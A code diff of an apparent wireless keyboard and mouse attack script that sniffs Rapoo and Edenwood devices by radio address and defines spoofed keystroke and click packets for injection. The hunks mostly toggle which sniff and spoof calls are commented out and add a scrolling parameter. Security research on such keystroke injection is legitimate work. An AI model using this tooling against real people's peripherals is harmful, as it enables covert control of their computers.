@@ -52,8 +52,8 @@ common.parse_and_init()
 ----------------------------Initial analysis----------------------------
 """
 
-#Device.quick_sniff("c7:92:78:79:dc", [22, 26, 34, 38, 43, 47, 56, 60, 67, 71, 78, 82], common.RF_RATE_2M, 21)
-#Device.fuzz_channels("c7:92:78:79:dc", common.RF_RATE_2M)
+#Device.quick_sniff("52:d2:cb:cb:e5", [20, 40, 54, 81], common.RF_RATE_2M, 19)
+#Device.fuzz_channels("55:2d:2c:bc", common.RF_RATE_2M)
 
 
 """
@@ -129,7 +129,7 @@ attack_rapoo_mouse = [
     rapoo_mouse.build_packet([MouseClickType.LEFT_CLICK])
 ]
 
-rapoo_keyboard.sniff()
+#rapoo_keyboard.sniff()
 #rapoo_mouse.sniff()
 #rapoo_keyboard.spoof(attack_rapoo_keyboard)
 #rapoo_mouse.spoof(attack_rapoo_mouse)
@@ -141,9 +141,6 @@ rapoo_keyboard.sniff()
 
 edenwood_mouse = Edenwood_Mouse("55:2d:2c:bc:bc", 0x11021, 0x6818)
 edenwood_keyboard = Edenwood_Keyboard("55:2d:2c:bc:be", 0x11021, 0x6818)
-
-#edenwood_keyboard.sniff()
-#edenwood_mouse.sniff()
 
 attack_edenwood_keyboard = [
     edenwood_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
@@ -157,9 +154,12 @@ attack_edenwood_keyboard = [
 ]
 
 attack_edenwood_mouse = [
-    edenwood_mouse.build_packet([MouseClickType.LEFT_CLICK])
+    edenwood_mouse.build_packet([MouseClickType.LEFT_CLICK], scrolling_move="FF")
 ]
 
+
+#edenwood_keyboard.sniff()
+#edenwood_mouse.sniff()
 #edenwood_mouse.spoof(attack_edenwood_mouse)
 #edenwood_keyboard.spoof(attack_edenwood_keyboard) # not perfect, packet with same seq number might get repeated
 
